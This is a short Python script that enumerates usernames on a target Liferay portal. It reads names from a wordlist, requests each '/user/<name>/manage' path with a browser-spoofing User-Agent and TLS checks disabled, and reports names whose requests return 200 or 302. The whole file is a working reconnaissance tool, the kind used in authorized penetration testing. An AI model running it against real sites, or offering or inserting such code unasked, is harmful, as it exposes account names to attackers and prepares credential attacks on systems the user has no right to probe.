import requests
import argparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

session = requests.Session()

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", required=True, help="target liferay domain")
parser.add_argument("-w", "--wordlist", required=True, help="wordlist for enumeration")

args = parser.parse_args()
target = args.target
wordlist = args.wordlist

with open(wordlist) as wordlist_file:
    for line in wordlist_file:
        user = line.rstrip()
        uri = target + "/user/" + user + "/manage"
        headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36","Connection":"close","Accept":"*/*"}
        response = session.get(uri, headers=headers, verify=False)

        if response.status_code == 200 or response.status_code == 302:
            print("found username " + user)
